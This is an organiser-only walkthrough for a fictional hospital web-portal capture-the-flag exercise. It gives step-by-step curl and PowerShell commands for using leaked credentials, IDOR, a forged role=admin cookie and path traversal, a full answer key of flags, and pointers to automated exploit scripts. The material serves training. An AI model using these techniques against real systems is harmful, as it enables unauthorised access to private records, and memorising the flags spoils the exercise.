# 🔐 Walkthrough — Mercury General Hospital CTF
> **FOR CTF ORGANIZERS ONLY — do not distribute to players**

---

## Overview

| Flag   | Name                | Vulnerability                               | Difficulty |
|--------|---------------------|---------------------------------------------|------------|
| FLAG 3 | The Dental Record   | IDOR (Insecure Direct Object Reference)     | Easy       |
| FLAG 4 | The Security Footage| Broken Access Control (cookie manipulation) | Easy-Medium |
| FLAG 5 | The Prescription    | Path Traversal + Base64 decode              | Medium     |

---

## Entry Point — robots.txt Recon + Credential Discovery

Every engagement starts with reconnaissance. This CTF rewards players who follow
standard web-app recon methodology.

### Step 1 — Visit robots.txt

```
http://<TARGET>/robots.txt
```

Output:

```
User-agent: *
Disallow: /staff-backup/
Disallow: /admin-console/

# Note to webmaster: please confirm /staff-backup/ is not publicly accessible
# before the portal goes live — IT generated credential backup files there.
# Also: prescription archive not yet moved off the web root.
#   Current path: ../hospital-files/prescriptions/
```

Two interesting paths immediately: `/staff-backup/` and `/admin-console/`.

### Step 2 — Read the credential backup

```
http://<TARGET>/staff-backup/credentials.txt
```

Output (abbreviated):

```
Username : reception
Password : W0lfpack2009!
Role     : staff
```

### Step 3 — Log in

Navigate to `http://<TARGET>/login.php` and log in with:
- **Username:** `reception`
- **Password:** `W0lfpack2009!`

You are authenticated as `role: staff`.

---

## FLAG 3 — The Dental Record

**Vulnerability:** IDOR — Insecure Direct Object Reference

### Exploit

1. Log in as `reception`. Navigate to **Patient Records**.
2. Search for `MGH` — three patients appear: **MGH-0042**, **MGH-0043**, **MGH-0044**.
   Basic info only is shown in the search results.
3. Click **View** on MGH-0044 (Stuart Price), or request directly:

```
http://<TARGET>/records.php?pid=MGH-0044
```

The full physician notes and the flag are returned — **no role check** exists on the
detail endpoint. Any authenticated user can access any patient's complete record.

```
FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}
```

**Why it's IDOR:** The `pid` parameter is an Insecure Direct Object Reference.
The server validates authentication but not authorization.

---

## FLAG 4 — The Security Footage

**Vulnerability:** Broken Access Control — client-controlled role cookie

### Discovery (two trails)

**Trail A — JavaScript source**

Open browser DevTools → Sources → `assets/js/portal.js`:

```javascript
// TODO (IT-2247): Move role authorisation fully server-side.
// Currently the portal reads the HTTP cookie 'role' on both the
// client (for UI rendering) and server (camera.php, dashboard).
// Any client can forge Cookie: role=admin to unlock restricted sections.
```

**Trail B — Admin console page source**

```
http://<TARGET>/admin-console/
```

View page source. The HTML comment block includes:

```html
<!--
  IMPORTANT — Role Access Control (temporary workaround):
    The portal reads the HTTP Cookie named 'role' BEFORE the session role.
    See camera.php, line: $_COOKIE['role'] ?? $session['role']
    Valid values: admin | doctor | staff
-->
```

### Exploit

1. Log in as `reception`. Navigate to **Security Logs**.
   Camera entries load but no flag boxes appear (role=staff).
2. View page source — see: `<!-- role-restricted content requires doctor or admin access -->`
3. Set a `role` cookie to `admin` using DevTools → Application → Cookies,
   or with a proxy (Burp Suite):

```
Cookie: PHPSESSID=<session>; role=admin
```

   **Full curl workflow (Linux / macOS):**
```bash
# Step 1 — Login and save the authenticated session cookie to a file
curl -s -c /tmp/mgh.txt -b /tmp/mgh.txt \
     -X POST "http://<TARGET>/login.php" \
     -d "username=reception&password=W0lfpack2009!" \
     -L -o /dev/null

# Step 2 — Replay the camera page with role=admin forged alongside the session
curl -s -b /tmp/mgh.txt -b "role=admin" \
     "http://<TARGET>/camera.php" | grep -oE "FLAG\{[^}]+\}"
```

   **Full curl workflow (Windows PowerShell):**
```powershell
# Step 1 — Login and capture the session cookie
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
Invoke-WebRequest "http://<TARGET>/login.php" `
    -Method POST `
    -Body "username=reception&password=W0lfpack2009!" `
    -SessionVariable session | Out-Null

# Step 2 — Add the forged role=admin cookie and request camera.php
$session.Cookies.Add((New-Object System.Net.Cookie("role", "admin", "/", "<TARGET>")))
(Invoke-WebRequest "http://<TARGET>/camera.php" -WebSession $session).Content |
    Select-String -Pattern "FLAG\{[^}]+\}"
```

   > **Note:** You must complete Step 1 first — `require_login()` in camera.php
   > redirects unauthenticated requests to login.php. Without a valid PHPSESSID the
   > `role=admin` cookie alone will not expose the flag.

4. Reload. The flag box appears on the **CAM-03** entry:

```
FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}
```

---

## FLAG 5 — The Prescription

**Vulnerability:** Path Traversal on `files.php?file=`

### Discovery

`robots.txt` hints: `prescription archive not yet moved off the web root`.
The admin console source confirms: `Prescription archive path: ../hospital-files/prescriptions/hidden/`

### Exploit

The file viewer reads files relative to `docs/` but does **not sanitise `../`**:

```
http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
```

The page renders the full prescription file. Copy the Base64 block (three lines between
`--- ATTACHED NOTE ---` and `--- END OF ATTACHED NOTE ---`) and decode it.

**Option A — browser + CyberChef:**
Paste the Base64 block into [CyberChef](https://gchq.github.io/CyberChef/) and apply the
"From Base64" recipe.

**Option B — full Base64 string (Linux / macOS terminal):**
```bash
echo "V0FSRUhPVVNFIENPT1JESU5BVEVTOiAzNi4xMDI2IE4sIDExNS4xNzM0IFcgfCAzODUwIFMgVmFsbGV5IFZpZXcgQmx2ZCwgTGFzIFZlZ2FzLCBOViA4OTEwMyB8IEZMQUd7cHIzc2NyMXB0MTBuX2MwMHJkc19DaDB3X1c0cjNoMHVzM18zNk5fMTE1V18zODUwX1Y0bGwzeV9WMTN3fQ==" | base64 -d
```

**Option C — fetch + decode in one pipeline (Linux / macOS):**
```bash
# Step 1 — Login (saves PHPSESSID to /tmp/mgh.txt)
curl -s -c /tmp/mgh.txt -b /tmp/mgh.txt \
     -X POST "http://<TARGET>/login.php" \
     -d "username=reception&password=W0lfpack2009!" \
     -L -o /dev/null

# Step 2 — Path traversal, extract and decode the Base64 block in one pipeline
curl -s -b /tmp/mgh.txt \
     "http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt" \
  | awk '/ATTACHED NOTE \(encoded/{f=1;next} /END OF ATTACHED NOTE/{f=0;next} f && NF{printf "%s",$0}' \
  | base64 -d \
  | grep -oE "FLAG\{[^}]+\}"
```

Output:

```
WAREHOUSE COORDINATES: 36.1026 N, 115.1734 W | 3850 S Valley View Blvd, Las Vegas, NV 89103 | FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}
```

```
FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}
```

---

## Full Attack Chain

```
robots.txt
├── /staff-backup/credentials.txt  →  reception / W0lfpack2009!
│   │
│   ├── /records.php?pid=MGH-0044  →  IDOR  →  FLAG 3
│   │
│   ├── /camera.php
│   │   ├── /assets/js/portal.js  →  cookie TODO comment     ┐
│   │   ├── /admin-console/ source  →  cookie role hint      ├── forge Cookie:role=admin → FLAG 4
│   │   └── camera.php source comment  →  role hint          ┘
│   │
│   └── /files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
│       └── base64 decode  →  FLAG 5
│
└── /admin-console/  →  hints for FLAG 4 + FLAG 5
```

---

## All Flags

| Flag   | Value |
|--------|-------|
| FLAG 3 | `FLAG{d3nt4l_r3c0rd_stu_pull3d_h1s_0wn_t00th_0247AM_t0_pr0v3_h1s_l0v3}` |
| FLAG 4 | `FLAG{s3cur1ty_f00t4g3_ESV7749_Ch0w_w4r3h0us3_3850_V4ll3y_V13w}` |
| FLAG 5 | `FLAG{pr3scr1pt10n_c00rds_Ch0w_W4r3h0us3_36N_115W_3850_V4ll3y_V13w}` |

---

## Progressive Hints for Players

> **Organiser guidance:** Reveal hints in order, numbered 1 → 3, to keep the
> challenge alive as long as possible. Hint 3 for each flag is nearly a spoiler
> — save it for players who have been stuck for a long time.

---

### Entry Point — Getting In

| # | Hint |
|---|------|
| 1 | Every web assessment starts with reconnaissance. What file tells search engines which paths to avoid indexing? |
| 2 | Sensitive directories are sometimes listed in `robots.txt` to discourage crawlers — but those entries work like a treasure map for you. Visit each `Disallow` path in a browser. |
| 3 | `http://<TARGET>/staff-backup/credentials.txt` contains a plaintext credential. Use it to log in at `/login.php`. |

---

### FLAG 3 — The Dental Record (IDOR)

| # | Hint |
|---|------|
| 1 | After logging in, go to **Patient Records** and search for `MGH`. Three patients appear. The server hands you their IDs in the URL. What happens if you change the number? |
| 2 | The server checks *that you are logged in* when you request a detail page, but does it check *which patient you are allowed to see*? Try requesting a patient ID you were not explicitly given. |
| 3 | Request `http://<TARGET>/records.php?pid=MGH-0044` while logged in as `reception`. The full record — including the flag — is returned with no further authorisation check. |

---

### FLAG 4 — The Security Footage (Broken Access Control)

| # | Hint |
|---|------|
| 1 | The camera log page shows entries but no flags. Something is restricting the flag boxes. Look at the HTML source of the page — is there a comment that explains what controls access? |
| 2 | The restriction is client-side: your *role* is read from a cookie rather than solely from the server session. Browser DevTools → Application → Cookies lets you add or edit cookies for the current site. |
| 3 | Add a cookie named `role` with value `admin` (or `doctor`) for the target domain, then reload `/camera.php`. The flag box appears on the CAM-03 row. With curl: login first to get a PHPSESSID, then pass `-b "role=admin"` on the second request. |

---

### FLAG 5 — The Prescription (Path Traversal)

| # | Hint |
|---|------|
| 1 | `robots.txt` mentions a prescription archive that "hasn't been moved off the web root yet". The **File Viewer** (`/files.php`) reads files using a `?file=` parameter. What base directory does it read from? |
| 2 | The file viewer uses `docs/` as its base directory. It does **not** strip `../` sequences. What path, relative to `docs/`, would reach a `hospital-files/prescriptions/hidden/` directory one level up? |
| 3 | Request `http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt`. The response contains a Base64 block — decode it (CyberChef "From Base64" recipe, or `base64 -d` on Linux/macOS) to reveal the flag. |

---

## Automated Exploit Scripts

> Two ready-to-run scripts are provided in this directory. Both capture all three flags
> automatically against a running instance of the portal.

### Python (recommended — handles cookies cleanly)

```bash
# Install dependency once
pip install requests

# Run against Docker on localhost (default)
python3 solution/exploit.py

# Run against a remote / VM target
python3 solution/exploit.py http://192.168.1.50
```

### Bash / curl

```bash
# Make executable once
chmod +x solution/exploit.sh

# Run against Docker on localhost (default)
./solution/exploit.sh

# Run against a remote / VM target
./solution/exploit.sh http://192.168.1.50
```

Both scripts perform the full recon → login → flag capture chain and print each flag
as it is found. Replace the target URL with your VM's IP or hostname as needed.
